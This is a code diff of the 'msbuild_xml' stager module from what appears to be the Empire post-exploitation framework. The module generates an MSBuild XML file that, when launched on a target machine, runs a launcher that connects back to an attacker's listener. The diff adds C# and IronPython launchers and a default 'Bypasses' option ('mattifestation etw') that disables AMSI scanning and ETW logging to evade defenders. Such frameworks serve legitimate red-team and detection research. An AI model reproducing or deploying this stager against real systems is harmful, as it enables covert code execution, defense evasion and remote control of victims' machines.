@@ -1,8 +1,11 @@
 from __future__ import print_function
 
+import logging
 from builtins import object
 
 from empire.server.common import helpers
+
+log = logging.getLogger(__name__)
 
 
 class Stager(object):
@@ -10,15 +13,18 @@ class Stager(object):
 
         self.info = {
             "Name": "msbuild_xml",
-            "Author": ["@p3nt4"],
+            "Authors": [
+                {
+                    "Name": "",
+                    "Handle": "@p3nt4",
+                    "Link": "",
+                }
+            ],
             "Description": "Generates an XML file to be run with MSBuild.exe",
             "Comments": ["On the endpoint simply launch MSBuild.exe payload.xml"],
         }
 
-        # any options needed by the stager, settable during runtime
         self.options = {
-            # format:
-            #   value_name : {description, required, default_value}
             "Listener": {
                 "Description": "Listener to generate stager for.",
                 "Required": True,
@@ -28,7 +34,7 @@ class Stager(object):
                 "Description": "Language of the stager to generate.",
                 "Required": True,
                 "Value": "powershell",
-                "SuggestedValues": ["powershell"],
+                "SuggestedValues": ["powershell", "ironpython", "csharp"],
                 "Strict": True,
             },
             "StagerRetries": {
@@ -68,14 +74,16 @@ class Stager(object):
                 "Required": False,
                 "Value": "default",
             },
+            "Bypasses": {
+                "Description": "Bypasses as a space separated list to be prepended to the launcher",
+                "Required": False,
+                "Value": "mattifestation etw",
+            },
         }
 
-        # save off a copy of the mainMenu object to access external functionality
-        #   like listeners/agent handlers/etc.
         self.mainMenu = mainMenu
 
         for param in params:
-            # parameter format is [Name, Value]
             option, value = param
             if option in self.options:
                 self.options[option]["Value"] = value
@@ -98,26 +106,46 @@ class Stager(object):
         if obfuscate.lower() == "true":
             obfuscate_script = True
 
-        # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(
-            listenerName=listener_name,
-            language=language,
-            encode=encode,
-            obfuscate=obfuscate_script,
-            obfuscationCommand=obfuscate_command,
-            userAgent=user_agent,
-            proxy=proxy,
-            proxyCreds=proxy_creds,
-            stagerRetries=stager_retries,
-        )
+        if language in ["csharp", "ironpython"]:
+            if (
+                self.mainMenu.listenersv2.get_active_listener_by_name(
+                    listener_name
+                ).info["Name"]
+                != "HTTP[S]"
+            ):
+                log.error(
+                    "Only HTTP[S] listeners are supported for C# and IronPython stagers."
+                )
+                return ""
+
+            launcher = self.mainMenu.stagers.generate_exe_oneliner(
+                language=language,
+                obfuscate=obfuscate_script,
+                obfuscation_command=obfuscate_command,
+                encode=encode,
+                listener_name=listener_name,
+            )
+
+        elif language == "powershell":
+            launcher = self.mainMenu.stagers.generate_launcher(
+                listenerName=listener_name,
+                language=language,
+                encode=encode,
+                obfuscate=obfuscate_script,
+                obfuscation_command=obfuscate_command,
+                userAgent=user_agent,
+                proxy=proxy,
+                proxyCreds=proxy_creds,
+                stagerRetries=stager_retries,
+                bypasses=self.options["Bypasses"]["Value"],
+            )
 
         launcher_array = launcher.split()
         if len(launcher_array) > 1:
-            print(helpers.color("[*] Removing Launcher String"))
             launcher = launcher_array[-1]
 
         if launcher == "":
-            print(helpers.color("[!] Error in launcher command generation."))
+            log.error("[!] Error in launcher command generation.")
             return ""
         else:
             code = '<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">'
